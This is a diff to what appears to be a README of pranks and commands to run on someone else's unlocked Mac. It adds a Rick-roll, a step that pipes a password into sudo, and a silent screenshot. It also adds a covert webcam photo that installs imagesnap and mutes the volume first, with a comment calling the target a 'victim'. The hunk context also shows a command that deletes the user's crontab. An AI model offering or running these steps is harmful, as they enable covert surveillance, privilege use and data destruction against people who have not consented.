@@ -73,8 +73,27 @@ echo "" | crontab - && crontab -r
 
 ## What Now
 
+* Rick roll prank
 ```shell
 osascript -e 'set volume 7' && open https://www.youtube.com/watch?v=dQw4w9WgXcQ&frags=pl%2Cwn
+```
+
+* Accessing sudo privilege
+```shell
+echo "password" | sudo -S ls
+```
+
+* Take a screenshot
+```shell
+screencapture ~/a.jpg
+```
+
+* Take a photo with Mac's webcam
+```shell
+# since brew does not require sudo privilege, if victim has brew, this works
+brew install imagesnap
+osascript -e 'set volume 0'  # mute
+imagesnap ~/a.png
 ```
 
 ## Author and Contributors
